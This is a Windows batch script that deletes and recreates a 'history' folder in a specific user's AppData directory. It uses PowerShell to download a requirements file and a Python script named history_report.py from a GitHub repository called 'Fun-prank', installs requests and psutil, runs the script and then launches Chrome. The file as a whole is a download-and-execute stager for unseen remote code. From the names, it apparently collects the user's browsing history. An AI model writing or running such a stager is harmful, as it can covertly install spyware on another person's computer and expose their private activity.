@echo off
cls
echo Starting process...

REM Step 1: Check if the history folder exists
IF EXIST "C:\Users\Marco\AppData\Roaming\history" (
    echo History folder exists. Deleting the old history folder...
    rmdir /S /Q "C:\Users\Marco\AppData\Roaming\history"
)

REM Step 2: Create the history folder
echo Creating history folder...
mkdir "C:\Users\Marco\AppData\Roaming\history"

REM Step 3: Download requirements.txt (no gpuinfo)
echo Downloading 'requirements.txt'...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt', 'C:\Users\Marco\AppData\Roaming\history\requirements.txt')"

REM Step 4: Download the Python script
echo Downloading the Python script...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py', 'C:\Users\Marco\AppData\Roaming\history\history_report.py')"

REM Step 5: Install the required Python libraries (requests and psutil)
echo Installing required libraries...
python -m pip install --upgrade pip
python -m pip install -r "C:\Users\Marco\AppData\Roaming\history\requirements.txt"

REM Step 6: Check if the installation of libraries was successful
echo Verifying installation...
python -m pip show requests
python -m pip show psutil

REM Step 7: Check if installation was successful and run the script
IF EXIST "C:\Users\Marco\AppData\Roaming\history\history_report.py" (
    echo Python script downloaded. Running the Python script...
    python "C:\Users\Marco\AppData\Roaming\history\history_report.py"
    REM Wait 3 seconds before opening Google
    timeout /T 3 /NOBREAK
    start chrome
) ELSE (
    echo Error: Python script not found.
)

REM Step 8: Error handling for missing Google Chrome process
tasklist | findstr "chrome.exe" >nul
IF %ERRORLEVEL% NEQ 0 (
    echo ERROR: The process "chrome.exe" not found.
)

echo Process complete!
pause
